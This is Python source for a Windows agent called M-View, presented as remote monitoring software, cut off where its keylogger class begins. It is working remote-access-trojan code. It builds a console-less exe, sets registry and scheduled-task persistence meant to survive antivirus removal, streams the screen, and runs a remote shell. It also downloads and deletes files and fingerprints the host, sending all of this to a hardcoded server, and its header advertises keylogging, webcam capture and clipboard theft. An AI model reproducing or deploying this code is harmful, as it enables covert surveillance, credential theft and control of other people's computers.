"""
╔══════════════════════════════════════════════════════════════════╗
║          M-VIEW MASTER AGENT  v4.0  — GLOBAL PRODUCTION          ║
║          Remote Management & Monitoring Agent                    ║
║                                                                  ║
║  WHAT'S NEW IN v4.0:                                             ║
║  • HYBRID STREAMING — default=video (MJPEG over WebSocket)       ║
║    Dashboard can switch to fast-screenshot mode anytime          ║
║  • REAL-TIME CURSOR OVERLAY — cursor position, clicks, type      ║
║    sent with every frame so dashboard renders it on top          ║
║  • TRUE VIDEO MODE — OpenCV encodes frames into MJPEG,           ║
║    adaptive FPS + quality drops automatically on slow net        ║
║  • CURSOR CONTROL — full mouse move/click/scroll/drag            ║
║  • KEYBOARD CONTROL — all keys, combos, special keys             ║
║  • KEYLOGGER — captures all keystrokes with window context       ║
║  • CLIPBOARD — auto-monitor + remote get/set                     ║
║  • FILE BROWSER — list, read, download, delete, drives           ║
║  • SHELL — cmd + PowerShell with streaming output                ║
║  • PROCESS MANAGER — list, kill, start                           ║
║  • SYSTEM TELEMETRY — CPU, RAM, GPU, Disk, Net, Temp, Battery    ║
║  • WEBCAM CAPTURE — list cameras, single frame or stream         ║
║  • AUDIO LEVEL MONITOR                                           ║
║  • STARTUP PERSISTENCE — dual registry + Task Scheduler          ║
║  • AUTO-RECONNECT — exponential backoff with jitter              ║
║  • WATCHDOG THREAD — restarts itself if main loop dies           ║
║  • AES-256 ENCRYPTION (optional)                                 ║
║  • RENDER / GLOBAL SERVER READY (uses HTTPS + WSS)               ║
╚══════════════════════════════════════════════════════════════════╝

BUILD COMMAND:
  Activate your clean virtual environment first, then:

  pip install python-socketio[client] mss Pillow psutil pywin32 ^
              pynput pyperclip cryptography opencv-python numpy ^
              requests wmi pyautogui pyinstaller

  pyinstaller --onefile --noconsole --icon=icon.ico ^
    --distpath ./bin --name master_agent ^
    --hidden-import=engineio.async_drivers.threading ^
    --hidden-import=pkg_resources.extern ^
    --hidden-import=cv2 ^
    --hidden-import=pynput.keyboard ^
    --hidden-import=pynput.mouse ^
    agent_source.py

  Expected output size: 25–40 MB (clean_env with no system packages)

RENDER / PRODUCTION:
  Change SERVER_URL below to your Render URL before compiling:
    "SERVER_URL": "https://screen-connect-rtca.onrender.com"
"""

# ── Standard Library ──────────────────────────────────────────────────────────
import os
import sys
import time
import json
import base64
import hashlib
import socket
import platform
import threading
import subprocess
import tempfile
import logging
import winreg
import ctypes
import uuid
import struct
import random
from io import BytesIO
from pathlib import Path
from datetime import datetime
from queue import Queue, Empty, Full

# ── Third-Party ───────────────────────────────────────────────────────────────
import socketio
import mss
import psutil
import requests
from PIL import Image, ImageDraw
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Optional — handled gracefully if package is missing
try:
    import pyautogui
    pyautogui.FAILSAFE = False
    PYAUTOGUI_OK = True
except ImportError:
    PYAUTOGUI_OK = False

try:
    import cv2
    import numpy as np
    CV2_OK = True
except ImportError:
    CV2_OK = False

try:
    import pynput.keyboard
    import pynput.mouse
    PYNPUT_OK = True
except ImportError:
    PYNPUT_OK = False

try:
    import pyperclip
    CLIPBOARD_OK = True
except ImportError:
    CLIPBOARD_OK = False

try:
    import wmi
    WMI_OK = True
except ImportError:
    WMI_OK = False

# ════════════════════════════════════════════════════════════════════════════
#  TRAILER TOKEN READER
#  Server appends 64-byte trailer to the exe at download time:
#    [0:4]   b"MVTK"  — magic head
#    [4:60]  token     — utf-8, null-padded to 56 bytes
#    [60:64] b"MVED"  — magic tail
# ════════════════════════════════════════════════════════════════════════════
_TRAILER_SIZE = 64
_MAGIC_HEAD   = b"MVTK"
_MAGIC_TAIL   = b"MVED"

def _read_token_from_trailer() -> str:
    try:
        exe = Path(sys.executable if getattr(sys, "frozen", False) else __file__).resolve()
        data = exe.read_bytes()
        if len(data) < _TRAILER_SIZE:
            return ""
        trailer = data[-_TRAILER_SIZE:]
        if trailer[:4] != _MAGIC_HEAD or trailer[60:64] != _MAGIC_TAIL:
            return ""
        return trailer[4:60].rstrip(b"\x00").decode("utf-8").strip()
    except Exception:
        return ""


# ════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ════════════════════════════════════════════════════════════════════════════
CONFIG = {
    # ── Connection ──────────────────────────────────────────────────────────
    # CHANGE THIS to your Render URL before compiling for production:
    "SERVER_URL":          "https://screen-connect-rtca.onrender.com",

    # Token is injected as a binary trailer by the server at download time.
    "DEVICE_TOKEN":        "UNSET",

    # ── Identity ────────────────────────────────────────────────────────────
    "AGENT_VERSION":       "4.0.0",
    "HEARTBEAT_INTERVAL":  10,
    "RECONNECT_BASE":      3,
    "RECONNECT_MAX":       120,

    # ── Streaming — Hybrid Mode ─────────────────────────────────────────────
    # MODE:
    #   "video"       — DEFAULT. OpenCV MJPEG, smooth cursor, adaptive quality.
    #                   Looks like real video. Best for good networks.
    #   "screenshot"  — Rapid JPEG snapshots. Better for slow networks.
    #                   Dashboard can switch to this mode at any time.
    "STREAM_MODE":         "video",    # "video" | "screenshot"

    # Video mode settings
    "STREAM_FPS":          20,         # target fps (video mode)
    "STREAM_QUALITY":      55,         # JPEG quality 1–95
    "STREAM_SCALE":        0.80,       # downscale factor (1.0 = native res)
    "STREAM_MONITOR":      1,          # monitor index (1 = primary)

    # Adaptive quality — drops quality when frame send is lagging
    "ADAPTIVE_QUALITY":    True,
    "QUALITY_MIN":         20,
    "QUALITY_MAX":         85,

    # Screenshot mode fallback settings
    "SCREENSHOT_FPS":      8,          # fps in screenshot mode
    "SCREENSHOT_QUALITY":  60,

    # ── Cursor overlay ──────────────────────────────────────────────────────
    "CURSOR_OVERLAY":      True,       # draw cursor dot on every frame
    "CURSOR_TRACK":        True,       # send separate cursor_pos events

    # ── Security ────────────────────────────────────────────────────────────
    "ENCRYPTION_PASSWORD": "mview-enterprise-2024",
    "ENCRYPT_PAYLOADS":    False,

    # ── Persistence ─────────────────────────────────────────────────────────
    "INSTALL_PERSISTENCE": True,
    "REG_KEY_NAME":        "MViewSystemService",
    "TASK_NAME":           "MViewSystemTask",      # Task Scheduler fallback
    "STARTUP_DELAY":       5,

    # ── Features ────────────────────────────────────────────────────────────
    "ENABLE_KEYLOGGER":    True,
    "ENABLE_CLIPBOARD":    True,
    "ENABLE_WEBCAM":       True,
    "ENABLE_PROCESS_MGR":  True,
    "ENABLE_FILE_BROWSER": True,
    "ENABLE_SHELL":        True,
    "KEYLOG_FLUSH_INTERVAL": 20,
    "CLIPBOARD_POLL_MS":   800,
}

# Inject token from trailer
_tok = _read_token_from_trailer()
CONFIG["DEVICE_TOKEN"] = _tok if _tok else "UNSET-RUN-VIA-SERVER"


# ════════════════════════════════════════════════════════════════════════════
#  LOGGING — writes to %TEMP%\mview_agent.log, silent in noconsole mode
# ════════════════════════════════════════════════════════════════════════════
LOG_FILE = Path(tempfile.gettempdir()) / "mview_agent.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8")],
)
log = logging.getLogger("mview")


# ════════════════════════════════════════════════════════════════════════════
#  ENCRYPTION MODULE
# ════════════════════════════════════════════════════════════════════════════
class Encryptor:
    def __init__(self, password: str):
        salt = b"mview_salt_2024_"
        kdf  = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100_000)
        self._fernet = Fernet(base64.urlsafe_b64encode(kdf.derive(password.encode())))

    def encrypt(self, data: str) -> str:
        return self._fernet.encrypt(data.encode()).decode()

    def encrypt_bytes(self, data: bytes) -> bytes:
        return self._fernet.encrypt(data)


_encryptor = Encryptor(CONFIG["ENCRYPTION_PASSWORD"])


def safe_emit(sio_client, event: str, payload: dict):
    if CONFIG["ENCRYPT_PAYLOADS"]:
        sio_client.emit(event, {"encrypted": True, "data": _encryptor.encrypt(json.dumps(payload))})
    else:
        sio_client.emit(event, payload)


# ════════════════════════════════════════════════════════════════════════════
#  DEVICE IDENTITY
# ════════════════════════════════════════════════════════════════════════════
def get_device_id() -> str:
    try:
        raw = f"{uuid.getnode()}-{socket.gethostname()}-{CONFIG['DEVICE_TOKEN']}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()
    except Exception:
        return CONFIG["DEVICE_TOKEN"]


def get_device_fingerprint() -> dict:
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        local_ip = "unknown"

    uname = platform.uname()
    fp = {
        "device_id":     CONFIG["DEVICE_TOKEN"],
        "token":         CONFIG["DEVICE_TOKEN"],
        "hardware_id":   get_device_id(),
        "hostname":      socket.gethostname(),
        "username":      os.getenv("USERNAME") or os.getenv("USER") or "unknown",
        "os":            f"{uname.system} {uname.release}",
        "os_version":    uname.version,
        "machine":       uname.machine,
        "processor":     uname.processor,
        "local_ip":      local_ip,
        "agent_version": CONFIG["AGENT_VERSION"],
        "stream_mode":   CONFIG["STREAM_MODE"],
        "timestamp":     datetime.utcnow().isoformat(),
        "screen_count":  _get_screen_count(),
        "cpu_count":     psutil.cpu_count(logical=True),
        "ram_total_gb":  round(psutil.virtual_memory().total / (1024**3), 2),
    }
    if WMI_OK:
        try:
            gpus = [g.Name for g in wmi.WMI().Win32_VideoController()]
            fp["gpu"] = ", ".join(gpus) or "unknown"
        except Exception:
            fp["gpu"] = "unknown"
    return fp


def _get_screen_count() -> int:
    try:
        with mss.mss() as sct:
            return len(sct.monitors) - 1
    except Exception:
        return 1


# ════════════════════════════════════════════════════════════════════════════
#  PERSISTENCE MODULE — dual method (Registry + Task Scheduler fallback)
#  Registry: HKCU\...\Run  (no admin needed)
#  Task Scheduler: survives even if registry key is removed by AV
# ════════════════════════════════════════════════════════════════════════════
def install_persistence():
    if not CONFIG["INSTALL_PERSISTENCE"]:
        return
    exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    exe_quoted = f'"{exe}"'

    # Method 1: Registry HKCU Run key
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, CONFIG["REG_KEY_NAME"], 0, winreg.REG_SZ, exe_quoted)
        log.info(f"Registry persistence installed: {exe}")
    except Exception as e:
        log.warning(f"Registry persistence failed: {e}")

    # Method 2: Task Scheduler (survives reboot, runs even before login)
    try:
        task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled><Delay>PT10S</Delay></BootTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>{exe}</Command>
    </Exec>
  </Actions>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
</Task>"""
        xml_path = Path(tempfile.gettempdir()) / "mview_task.xml"
        xml_path.write_text(task_xml, encoding="utf-16")
        subprocess.run(
            ["schtasks", "/create", "/tn", CONFIG["TASK_NAME"], "/xml", str(xml_path), "/f"],
            capture_output=True, timeout=15
        )
        xml_path.unlink(missing_ok=True)
        log.info("Task Scheduler persistence installed.")
    except Exception as e:
        log.warning(f"Task Scheduler persistence failed: {e}")


def remove_persistence():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, CONFIG["REG_KEY_NAME"])
    except Exception:
        pass
    try:
        subprocess.run(["schtasks", "/delete", "/tn", CONFIG["TASK_NAME"], "/f"],
                       capture_output=True, timeout=10)
    except Exception:
        pass
    log.info("Persistence removed.")


# ════════════════════════════════════════════════════════════════════════════
#  CURSOR TRACKER
#  Runs in background, tracks cursor position + click state.
#  Used by ScreenStreamer to overlay cursor on every frame.
# ════════════════════════════════════════════════════════════════════════════
class CursorTracker:
    """Lightweight cursor position + click state tracker."""

    def __init__(self, sio_client):
        self.sio      = sio_client
        self.x        = 0
        self.y        = 0
        self.clicking = False     # True while any button is held
        self.click_type = ""      # "left" | "right" | ""
        self._lock    = threading.Lock()
        self._running = False
        self._listener = None

    def start(self):
        if not PYNPUT_OK or self._running:
            return
        self._running = True

        def on_move(x, y):
            with self._lock:
                self.x, self.y = x, y

        def on_click(x, y, button, pressed):
            with self._lock:
                self.x, self.y  = x, y
                self.clicking   = pressed
                self.click_type = "right" if "right" in str(button) else "left"
            # Emit cursor event so dashboard can show click flash
            try:
                self.sio.emit("cursor_event", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "x": x, "y": y,
                    "type": "click" if pressed else "release",
                    "button": self.click_type,
                    "ts": datetime.utcnow().isoformat(),
                })
            except Exception:
                pass

        self._listener = pynput.mouse.Listener(on_move=on_move, on_click=on_click)
        self._listener.start()

    def stop(self):
        self._running = False
        if self._listener:
            self._listener.stop()

    def get_pos(self):
        with self._lock:
            return self.x, self.y, self.clicking, self.click_type


# ════════════════════════════════════════════════════════════════════════════
#  SCREEN STREAMER — HYBRID VIDEO / SCREENSHOT MODE
#
#  VIDEO MODE (default):
#    - Captures frames with mss (fastest screen capture library)
#    - Converts to numpy array, draws cursor overlay with OpenCV
#    - Encodes as JPEG via cv2.imencode (much faster than Pillow for video)
#    - Sends base64 frame over socket "screen_data" event
#    - Adaptive quality: if frame queue is backing up, drops JPEG quality
#    - Target: 20fps at 80% scale → looks like smooth video
#
#  SCREENSHOT MODE (fallback):
#    - Pillow JPEG encode, no cursor overlay computation
#    - 8fps default, very low CPU overhead
#    - Dashboard can request this mode for slow networks
#
#  CURSOR OVERLAY:
#    - White circle with black border drawn at real cursor position
#    - Click state shown as filled red dot
#    - All rendering happens in the capture thread (zero extra latency)
# ════════════════════════════════════════════════════════════════════════════
class ScreenStreamer:
    def __init__(self, sio_client, cursor_tracker: "CursorTracker"):
        self.sio     = sio_client
        self.cursor  = cursor_tracker
        self.mode    = CONFIG["STREAM_MODE"]      # "video" | "screenshot"
        self.fps     = CONFIG["STREAM_FPS"]
        self.quality = CONFIG["STREAM_QUALITY"]
        self.scale   = CONFIG["STREAM_SCALE"]
        self.monitor_idx = CONFIG["STREAM_MONITOR"]

        # Adaptive quality
        self._quality_current = self.quality
        self._frame_times: list = []        # rolling window of frame durations
        self._late_frames = 0              # count of frames that took too long

        self.streaming  = False
        self._thread: threading.Thread | None = None
        self._lock = threading.Lock()

    # ── Public API ───────────────────────────────────────────────────────────
    def start(self, monitor=None, fps=None, quality=None, scale=None, mode=None):
        with self._lock:
            if self.streaming:
                # Update params on the fly without restart
                if fps     is not None: self.fps     = fps
                if quality is not None: self.quality = quality; self._quality_current = quality
                if scale   is not None: self.scale   = scale
                if mode    is not None: self.mode    = mode
                return
            if monitor is not None: self.monitor_idx = monitor
            if fps     is not None: self.fps     = fps
            if quality is not None: self.quality = quality; self._quality_current = quality
            if scale   is not None: self.scale   = scale
            if mode    is not None: self.mode    = mode
            self.streaming = True
            target = self._video_loop if (self.mode == "video" and CV2_OK) else self._screenshot_loop
            self._thread = threading.Thread(target=target, daemon=True, name="mview-stream")
            self._thread.start()
            log.info(f"Stream started: mode={self.mode} fps={self.fps} quality={self._quality_current} scale={self.scale}")

    def stop(self):
        with self._lock:
            self.streaming = False
        if self._thread:
            self._thread.join(timeout=3)
        log.info("Stream stopped.")

    def set_mode(self, mode: str):
        """Hotswap between 'video' and 'screenshot' without stopping."""
        if mode not in ("video", "screenshot"):
            return
        was_streaming = self.streaming
        if was_streaming:
            self.stop()
        self.mode = mode
        if was_streaming:
            self.start()

    def capture_single(self) -> str | None:
        """One-shot screenshot, returns base64 JPEG string."""
        try:
            with mss.mss() as sct:
                mon = sct.monitors[min(self.monitor_idx, len(sct.monitors) - 1)]
                raw = sct.grab(mon)
                img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
                if self.scale != 1.0:
                    img = img.resize((int(img.width * self.scale), int(img.height * self.scale)), Image.LANCZOS)
                buf = BytesIO()
                img.save(buf, format="JPEG", quality=self.quality, optimize=True)
                return base64.b64encode(buf.getvalue()).decode()
        except Exception as e:
            log.error(f"capture_single error: {e}")
            return None

    # ── Video Loop (OpenCV MJPEG) ─────────────────────────────────────────
    def _video_loop(self):
        """
        High-performance video loop:
          mss grab → numpy → cv2 cursor overlay → cv2 JPEG encode → base64 → emit
        Each frame includes cursor position so the dashboard can render a smooth
        cursor that moves in real time even between frames.
        """
        interval = 1.0 / self.fps

        with mss.mss() as sct:
            while self.streaming:
                t0 = time.monotonic()
                try:
                    monitors = sct.monitors
                    idx = min(self.monitor_idx, len(monitors) - 1)
                    raw = sct.grab(monitors[idx])
                    mon_w, mon_h = raw.size

                    # numpy BGRA array (mss native format, fastest path)
                    frame = np.array(raw)         # shape: (h, w, 4)  BGRA
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)

                    # Scale
                    if self.scale != 1.0:
                        new_w = int(mon_w * self.scale)
                        new_h = int(mon_h * self.scale)
                        frame = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_LINEAR)
                    else:
                        new_w, new_h = mon_w, mon_h

                    # Cursor overlay
                    cx, cy, clicking, click_type = self.cursor.get_pos()
                    # Scale cursor position to match scaled frame
                    sx = int(cx * self.scale)
                    sy = int(cy * self.scale)

                    if CONFIG["CURSOR_OVERLAY"] and 0 <= sx < new_w and 0 <= sy < new_h:
                        # Outer white circle
                        cv2.circle(frame, (sx, sy), 10, (255, 255, 255), 2, cv2.LINE_AA)
                        # Inner black circle
                        cv2.circle(frame, (sx, sy), 3,  (0,   0,   0),  -1, cv2.LINE_AA)
                        # Click flash: red fill on click
                        if clicking:
                            color = (0, 0, 255) if click_type == "left" else (0, 165, 255)
                            cv2.circle(frame, (sx, sy), 8, color, -1, cv2.LINE_AA)
                            cv2.circle(frame, (sx, sy), 10, (255, 255, 255), 2, cv2.LINE_AA)

                    # Adaptive quality
                    if CONFIG["ADAPTIVE_QUALITY"]:
                        self._adapt_quality()

                    # Encode JPEG
                    encode_params = [cv2.IMWRITE_JPEG_QUALITY, self._quality_current]
                    success, buf = cv2.imencode(".jpg", frame, encode_params)
                    if not success:
                        continue

                    frame_b64 = base64.b64encode(buf.tobytes()).decode()

                    self.sio.emit("screen_data", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "frame":     frame_b64,
                        "image":     frame_b64,
                        "mode":      "video",
                        "w":         new_w,
                        "h":         new_h,
                        "mon_w":     mon_w,
                        "mon_h":     mon_h,
                        "cursor_x":  cx,
                        "cursor_y":  cy,
                        "clicking":  clicking,
                        "click_type": click_type,
                        "quality":   self._quality_current,
                        "fps_target": self.fps,
                        "ts":        datetime.utcnow().isoformat(),
                    })

                except Exception as e:
                    log.error(f"Video frame error: {e}")

                elapsed = time.monotonic() - t0
                self._frame_times.append(elapsed)
                if len(self._frame_times) > 30:
                    self._frame_times.pop(0)
                sleep_t = max(0.001, interval - elapsed)
                time.sleep(sleep_t)

    # ── Screenshot Loop (Pillow JPEG) ─────────────────────────────────────
    def _screenshot_loop(self):
        """
        Lightweight screenshot loop — for slow networks or when cv2 unavailable.
        Still includes cursor position in payload (no overlay drawn on frame).
        """
        fps = CONFIG["SCREENSHOT_FPS"] if self.mode == "screenshot" else self.fps
        interval = 1.0 / fps

        with mss.mss() as sct:
            while self.streaming:
                t0 = time.monotonic()
                try:
                    monitors = sct.monitors
                    idx = min(self.monitor_idx, len(monitors) - 1)
                    raw = sct.grab(monitors[idx])
                    img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
                    mon_w, mon_h = img.size

                    if self.scale != 1.0:
                        new_w = int(mon_w * self.scale)
                        new_h = int(mon_h * self.scale)
                        img = img.resize((new_w, new_h), Image.LANCZOS)
                    else:
                        new_w, new_h = mon_w, mon_h

                    cx, cy, clicking, click_type = self.cursor.get_pos()

                    buf = BytesIO()
                    q = CONFIG["SCREENSHOT_QUALITY"] if self.mode == "screenshot" else self._quality_current
                    img.save(buf, format="JPEG", quality=q, optimize=True)
                    frame_b64 = base64.b64encode(buf.getvalue()).decode()

                    self.sio.emit("screen_data", {
                        "device_id":  CONFIG["DEVICE_TOKEN"],
                        "frame":      frame_b64,
                        "image":      frame_b64,
                        "mode":       "screenshot",
                        "w":          new_w,
                        "h":          new_h,
                        "mon_w":      mon_w,
                        "mon_h":      mon_h,
                        "cursor_x":   cx,
                        "cursor_y":   cy,
                        "clicking":   clicking,
                        "click_type": click_type,
                        "quality":    q,
                        "ts":         datetime.utcnow().isoformat(),
                    })

                except Exception as e:
                    log.error(f"Screenshot frame error: {e}")

                elapsed = time.monotonic() - t0
                time.sleep(max(0.001, interval - elapsed))

    # ── Adaptive quality helper ───────────────────────────────────────────
    def _adapt_quality(self):
        """
        If average frame time exceeds the target interval by >30%,
        drop JPEG quality to reduce payload size and keep up.
        Recovers quality when frames are fast again.
        """
        if len(self._frame_times) < 10:
            return
        avg = sum(self._frame_times) / len(self._frame_times)
        target = 1.0 / self.fps
        if avg > target * 1.3:
            self._quality_current = max(CONFIG["QUALITY_MIN"], self._quality_current - 5)
        elif avg < target * 0.8:
            self._quality_current = min(CONFIG["QUALITY_MAX"], self._quality_current + 2)


# ════════════════════════════════════════════════════════════════════════════
#  SYSTEM TELEMETRY MODULE
# ════════════════════════════════════════════════════════════════════════════
class SystemMonitor:
    def __init__(self, sio_client):
        self.sio = sio_client
        self.monitoring = False
        self._thread: threading.Thread | None = None

    def start(self, interval: int = 2):
        if self.monitoring:
            return
        self.monitoring = True
        self._thread = threading.Thread(target=self._loop, args=(interval,), daemon=True)
        self._thread.start()

    def stop(self):
        self.monitoring = False

    def get_snapshot(self) -> dict:
        vm   = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        net  = psutil.net_io_counters()
        bat  = psutil.sensors_battery()

        stats = {
            "device_id":       CONFIG["DEVICE_TOKEN"],
            "ts":              datetime.utcnow().isoformat(),
            "cpu_percent":     psutil.cpu_percent(interval=0.1),
            "cpu_per_core":    psutil.cpu_percent(percpu=True),
            "cpu_count":       psutil.cpu_count(logical=True),
            "cpu_freq_mhz":    round(psutil.cpu_freq().current, 1) if psutil.cpu_freq() else 0,
            "ram_total_gb":    round(vm.total     / (1024**3), 2),
            "ram_used_gb":     round(vm.used      / (1024**3), 2),
            "ram_free_gb":     round(vm.available / (1024**3), 2),
            "ram_percent":     vm.percent,
            "disk_total_gb":   round(disk.total / (1024**3), 2),
            "disk_used_gb":    round(disk.used  / (1024**3), 2),
            "disk_free_gb":    round(disk.free  / (1024**3), 2),
            "disk_percent":    disk.percent,
            "net_sent_mb":     round(net.bytes_sent / (1024**2), 2),
            "net_recv_mb":     round(net.bytes_recv / (1024**2), 2),
            "net_packets_sent": net.packets_sent,
            "net_packets_recv": net.packets_recv,
            "battery_pct":     bat.percent      if bat else None,
            "battery_plug":    bat.power_plugged if bat else None,
            "boot_time":       datetime.fromtimestamp(psutil.boot_time()).isoformat(),
            "uptime_hrs":      round((time.time() - psutil.boot_time()) / 3600, 2),
        }

        if WMI_OK:
            try:
                c = wmi.WMI(namespace="root\\OpenHardwareMonitor")
                stats["temperatures"] = {s.Name: round(s.Value, 1) for s in c.Sensor() if s.SensorType == "Temperature"}
            except Exception:
                stats["temperatures"] = {}
            try:
                stats["gpus"] = [{"name": g.Name, "driver": g.DriverVersion} for g in wmi.WMI().Win32_VideoController()]
            except Exception:
                stats["gpus"] = []
        else:
            stats["temperatures"] = {}
            stats["gpus"] = []

        return stats

    def get_disk_list(self) -> list:
        result = []
        for p in psutil.disk_partitions(all=False):
            try:
                u = psutil.disk_usage(p.mountpoint)
                result.append({
                    "device": p.device, "mountpoint": p.mountpoint, "fstype": p.fstype,
                    "total_gb": round(u.total / (1024**3), 2),
                    "used_gb":  round(u.used  / (1024**3), 2),
                    "free_gb":  round(u.free  / (1024**3), 2),
                    "percent":  u.percent,
                })
            except Exception:
                pass
        return result

    def get_network_interfaces(self) -> dict:
        addrs = {}
        for iface, addr_list in psutil.net_if_addrs().items():
            addrs[iface] = [{"family": str(a.family), "address": a.address, "netmask": a.netmask} for a in addr_list]
        return addrs

    def _loop(self, interval):
        while self.monitoring:
            try:
                self.sio.emit("system_stats_report", self.get_snapshot())
            except Exception as e:
                log.error(f"SysMonitor error: {e}")
            time.sleep(interval)


# ════════════════════════════════════════════════════════════════════════════
#  PROCESS MANAGER
# ════════════════════════════════════════════════════════════════════════════
class ProcessManager:
    @staticmethod
    def list_processes() -> list:
        procs = []
        for p in psutil.process_iter(["pid", "name", "status", "cpu_percent", "memory_percent", "username", "create_time"]):
            try:
                info = p.info
                info["memory_mb"]   = round(p.memory_info().rss / (1024**2), 2)
                info["create_time"] = datetime.fromtimestamp(info["create_time"]).isoformat() if info.get("create_time") else None
                procs.append(info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return sorted(procs, key=lambda x: x.get("cpu_percent", 0), reverse=True)

    @staticmethod
    def kill_process(pid: int) -> dict:
        try:
            p = psutil.Process(pid)
            name = p.name()
            p.terminate()
            time.sleep(0.5)
            if p.is_running():
                p.kill()
            return {"success": True, "message": f"'{name}' (PID {pid}) terminated."}
        except psutil.NoSuchProcess:
            return {"success": False, "message": f"PID {pid} not found."}
        except psutil.AccessDenied:
            return {"success": False, "message": f"Access denied for PID {pid}."}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def start_process(command: str) -> dict:
        try:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return {"success": True, "pid": proc.pid, "message": f"Started: {command}"}
        except Exception as e:
            return {"success": False, "message": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  FILE BROWSER
# ════════════════════════════════════════════════════════════════════════════
class FileBrowser:
    MAX_UPLOAD_MB = 50

    @staticmethod
    def list_directory(path: str) -> dict:
        try:
            p = Path(path)
            if not p.exists():   return {"error": f"Not found: {path}"}
            if not p.is_dir():   return {"error": f"Not a directory: {path}"}
            entries = []
            for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
                try:
                    stat = item.stat()
                    entries.append({
                        "name":     item.name,
                        "path":     str(item),
                        "type":     "dir" if item.is_dir() else "file",
                        "size_kb":  round(stat.st_size / 1024, 2) if item.is_file() else None,
                        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        "hidden":   item.name.startswith("."),
                    })
                except (PermissionError, OSError):
                    pass
            return {"path": str(p), "parent": str(p.parent), "entries": entries, "count": len(entries)}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def read_file(path: str, max_kb: int = 512) -> dict:
        try:
            p = Path(path)
            if not p.is_file():
                return {"error": "Not a file."}
            size_kb = p.stat().st_size / 1024
            if size_kb > max_kb:
                return {"error": f"File too large ({size_kb:.1f} KB > {max_kb} KB)."}
            try:    content = p.read_text(encoding="utf-8")
            except: content = p.read_text(encoding="latin-1")
            return {"path": str(p), "content": content, "size_kb": round(size_kb, 2), "lines": content.count("\n")}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def download_file(path: str) -> dict:
        try:
            p = Path(path)
            if not p.is_file():
                return {"error": "Not a file."}
            size_mb = p.stat().st_size / (1024**2)
            if size_mb > FileBrowser.MAX_UPLOAD_MB:
                return {"error": f"File too large ({size_mb:.1f} MB)."}
            return {
                "path":     str(p),
                "filename": p.name,
                "size_mb":  round(size_mb, 3),
                "data":     base64.b64encode(p.read_bytes()).decode(),
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def delete_file(path: str) -> dict:
        try:
            p = Path(path)
            if p.is_file():
                p.unlink()
                return {"success": True, "message": f"Deleted: {path}"}
            elif p.is_dir():
                import shutil; shutil.rmtree(str(p))
                return {"success": True, "message": f"Deleted dir: {path}"}
            return {"success": False, "message": "Path not found."}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def list_drives() -> list:
        drives = []
        for p in psutil.disk_partitions(all=False):
            try:
                u = psutil.disk_usage(p.mountpoint)
                drives.append({
                    "drive":    p.mountpoint,
                    "total_gb": round(u.total / (1024**3), 2),
                    "free_gb":  round(u.free  / (1024**3), 2),
                    "percent":  u.percent,
                    "fstype":   p.fstype,
                })
            except Exception:
                pass
        return drives


# ════════════════════════════════════════════════════════════════════════════
#  REMOTE SHELL
# ════════════════════════════════════════════════════════════════════════════
class RemoteShell:
    TIMEOUT = 30

    @staticmethod
    def execute(command: str, shell_type: str = "cmd") -> dict:
        t0 = time.time()
        try:
            cmd = ["powershell", "-NoProfile", "-NonInteractive", "-Command", command] \
                  if shell_type == "powershell" else command
            result = subprocess.run(
                cmd, shell=(shell_type == "cmd"),
                capture_output=True, text=True, timeout=RemoteShell.TIMEOUT
            )
            return {
                "success":    True,
                "command":    command,
                "stdout":     result.stdout[-8192:],
                "stderr":     result.stderr[-4096:],
                "returncode": result.returncode,
                "elapsed_s":  round(time.time() - t0, 3),
                "ts":         datetime.utcnow().isoformat(),
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "command": command, "error": "Timed out (30s)."}
        except Exception as e:
            return {"success": False, "command": command, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  KEYLOGGER — captures keystrokes + active window title
# ════════════════════════════════════════════════════════════════════════════
class KeyLogger:
